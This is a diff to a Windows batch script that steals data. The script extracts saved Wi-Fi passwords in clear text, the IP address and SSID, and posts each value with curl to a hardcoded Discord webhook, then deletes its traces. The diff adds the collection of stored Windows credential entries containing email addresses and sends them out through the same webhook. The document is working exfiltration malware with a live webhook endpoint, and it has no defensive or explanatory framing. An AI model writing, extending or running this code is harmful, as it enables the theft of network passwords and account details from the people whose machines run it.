@@ -14,6 +14,8 @@ for /f "tokens=2,3 delims=:" %%a in ( 'netsh wlan show profiles' ) do (
 )
 netsh wlan show profile %ssid% key=clear | find "Key Content" > wifipass.txt
 
+cmdkey /list | find "@" >> email.txt
+
 echo ------------------------------------- > line2.txt 
 
 rem passage of variables 
@@ -25,6 +27,8 @@ set /p "ipv4=" < ipv4.txt
 set /p "ssidz=" < ssid.txt
 set /p "wifipasswd="< wifipass.txt
 set /p "line2=" < line2.txt
+set /p "email=" < email.txt
+
 
 rem server by transfering informations
 set webhook="https://discordapp.com/api/webhooks/1311809848148627486/hC8h2iJ0RMqPsVYweQ6w9VIlhDb7GilnF9srYC9JI5OHerQHNH557x9-IUyuYHH-1jNN"
@@ -38,6 +42,7 @@ del ipv4.txt
 del ssid.txt
 del wifipass.txt
 del line2.txt
+del email.txt
 
 rem data transfer mode
 cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line1%\"}" %webhook%
@@ -56,3 +61,4 @@ cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wif
 cmd /c timeout /t 0 > nul
 cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
 cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%email%\"}" %webhook%
